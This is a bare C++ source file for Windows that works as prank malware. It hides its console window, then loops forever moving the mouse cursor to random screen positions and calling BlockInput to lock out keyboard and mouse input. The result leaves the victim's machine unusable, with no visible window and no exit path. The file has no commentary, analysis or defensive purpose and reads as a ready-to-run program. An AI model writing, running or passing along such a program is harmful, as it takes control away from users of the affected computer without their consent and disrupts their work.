#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <WinUser.h>
#include <conio.h>
#include <ctime>
using namespace std;

int random, Freq, Dur, X, Y;
void CrazyMouse();
#if       _WIN32_WINNT < 0x0500
#undef  _WIN32_WINNT
#define _WIN32_WINNT   0x0500
#endif
#include <windows.h>
int main()
{
	srand(time(0));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (1)
	{
		CrazyMouse();
		Sleep(1);
		BlockInput(true);
	}
}
void CrazyMouse()
{
	X = rand() % 801;
	Y = rand() % 601;
	SetCursorPos(X, Y);
}